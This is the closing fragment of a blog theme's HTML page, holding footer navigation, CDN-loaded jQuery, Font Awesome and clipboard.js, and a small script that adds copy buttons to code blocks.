       --><li><a href="/categories/">Category</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
